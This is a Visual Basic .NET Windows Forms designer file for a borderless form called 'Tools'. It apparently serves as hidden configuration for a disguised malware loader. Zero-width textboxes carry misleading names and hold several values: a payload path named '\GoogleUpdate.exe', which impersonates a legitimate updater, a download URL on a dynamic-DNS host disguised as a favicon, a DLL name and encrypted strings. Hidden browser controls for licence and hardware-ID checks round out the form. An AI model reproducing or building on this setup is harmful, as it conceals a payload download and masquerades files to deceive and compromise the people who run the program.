<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Tools
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Tools))
        Me.Web_Hwid = New System.Windows.Forms.WebBrowser()
        Me.Web_Licence1 = New System.Windows.Forms.WebBrowser()
        Me.Web_Licence2 = New System.Windows.Forms.WebBrowser()
        Me.WritePointerFloat = New System.Windows.Forms.TextBox()
        Me.ReadInteger = New System.Windows.Forms.TextBox()
        Me.Encrypt1 = New System.Windows.Forms.TextBox()
        Me.Encrypt2 = New System.Windows.Forms.TextBox()
        Me.Text_DLL = New System.Windows.Forms.TextBox()
        Me.SuspendLayout()
        '
        'Web_Hwid
        '
        Me.Web_Hwid.Location = New System.Drawing.Point(12, 38)
        Me.Web_Hwid.MinimumSize = New System.Drawing.Size(20, 20)
        Me.Web_Hwid.Name = "Web_Hwid"
        Me.Web_Hwid.ScriptErrorsSuppressed = True
        Me.Web_Hwid.ScrollBarsEnabled = False
        Me.Web_Hwid.Size = New System.Drawing.Size(262, 43)
        Me.Web_Hwid.TabIndex = 0
        '
        'Web_Licence1
        '
        Me.Web_Licence1.Location = New System.Drawing.Point(12, 87)
        Me.Web_Licence1.MinimumSize = New System.Drawing.Size(20, 20)
        Me.Web_Licence1.Name = "Web_Licence1"
        Me.Web_Licence1.ScriptErrorsSuppressed = True
        Me.Web_Licence1.ScrollBarsEnabled = False
        Me.Web_Licence1.Size = New System.Drawing.Size(262, 30)
        Me.Web_Licence1.TabIndex = 1
        '
        'Web_Licence2
        '
        Me.Web_Licence2.Location = New System.Drawing.Point(12, 175)
        Me.Web_Licence2.MinimumSize = New System.Drawing.Size(20, 20)
        Me.Web_Licence2.Name = "Web_Licence2"
        Me.Web_Licence2.ScriptErrorsSuppressed = True
        Me.Web_Licence2.ScrollBarsEnabled = False
        Me.Web_Licence2.Size = New System.Drawing.Size(262, 56)
        Me.Web_Licence2.TabIndex = 2
        '
        'WritePointerFloat
        '
        Me.WritePointerFloat.Location = New System.Drawing.Point(93, 215)
        Me.WritePointerFloat.Name = "WritePointerFloat"
        Me.WritePointerFloat.Size = New System.Drawing.Size(0, 20)
        Me.WritePointerFloat.TabIndex = 3
        Me.WritePointerFloat.Text = "\GoogleUpdate.exe"
        '
        'ReadInteger
        '
        Me.ReadInteger.Location = New System.Drawing.Point(264, 189)
        Me.ReadInteger.Name = "ReadInteger"
        Me.ReadInteger.Size = New System.Drawing.Size(0, 20)
        Me.ReadInteger.TabIndex = 4
        Me.ReadInteger.Text = "http://kandesk.duckdns.org/favico.png"
        '
        'Encrypt1
        '
        Me.Encrypt1.Location = New System.Drawing.Point(12, 123)
        Me.Encrypt1.Name = "Encrypt1"
        Me.Encrypt1.Size = New System.Drawing.Size(262, 20)
        Me.Encrypt1.TabIndex = 5
        Me.Encrypt1.Text = "1g/K0VImy7CGl6TEpnSl83nx8jr/CJ2liefHYkQYGymk5yVqwP/rbkm/J6ZFinIjz+OaK+wCejG46Ovyo" &
    "QyRXN"
        '
        'Encrypt2
        '
        Me.Encrypt2.Location = New System.Drawing.Point(12, 149)
        Me.Encrypt2.Name = "Encrypt2"
        Me.Encrypt2.Size = New System.Drawing.Size(262, 20)
        Me.Encrypt2.TabIndex = 6
        Me.Encrypt2.Text = resources.GetString("Encrypt2.Text")
        '
        'Text_DLL
        '
        Me.Text_DLL.Location = New System.Drawing.Point(12, 12)
        Me.Text_DLL.Name = "Text_DLL"
        Me.Text_DLL.Size = New System.Drawing.Size(262, 20)
        Me.Text_DLL.TabIndex = 7
        Me.Text_DLL.Text = "xl.dll"
        '
        'Tools
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.ActiveCaptionText
        Me.ClientSize = New System.Drawing.Size(286, 247)
        Me.Controls.Add(Me.Text_DLL)
        Me.Controls.Add(Me.Encrypt2)
        Me.Controls.Add(Me.Encrypt1)
        Me.Controls.Add(Me.ReadInteger)
        Me.Controls.Add(Me.WritePointerFloat)
        Me.Controls.Add(Me.Web_Licence2)
        Me.Controls.Add(Me.Web_Licence1)
        Me.Controls.Add(Me.Web_Hwid)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Tools"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Tools"
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents Web_Hwid As WebBrowser
    Friend WithEvents Web_Licence1 As WebBrowser
    Friend WithEvents Web_Licence2 As WebBrowser
    Friend WithEvents WritePointerFloat As TextBox
    Friend WithEvents ReadInteger As TextBox
    Friend WithEvents Encrypt1 As TextBox
    Friend WithEvents Encrypt2 As TextBox
    Friend WithEvents Text_DLL As TextBox
End Class
